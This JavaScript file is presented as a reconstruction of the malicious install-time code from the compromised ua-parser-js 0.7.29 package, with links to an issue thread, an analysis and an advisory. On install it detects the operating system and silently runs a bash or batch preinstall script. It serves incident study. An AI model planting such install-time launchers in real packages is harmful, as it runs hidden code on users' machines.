// ua-parser-js@0.7.29 — reconstructed from public security analyses
// Source: https://github.com/faisalman/ua-parser-js/issues/536
// Source: https://grumpy.systems/2021/ua-parser-js-compromise/
// Advisory: GHSA-pjwm-rvh2-c87w

const { exec } = require("child_process");

function terminalLinux(){
    exec("/bin/bash preinstall.sh", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
}

var opsys = process.platform;
if (opsys == "darwin") {
    opsys = "MacOS";
} else if (opsys == "win32" || opsys == "win64") {
    opsys = "Windows";
    const { spawn } = require('child_process');
    const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']);
} else if (opsys == "linux") {
    opsys = "Linux";
    terminalLinux();
}
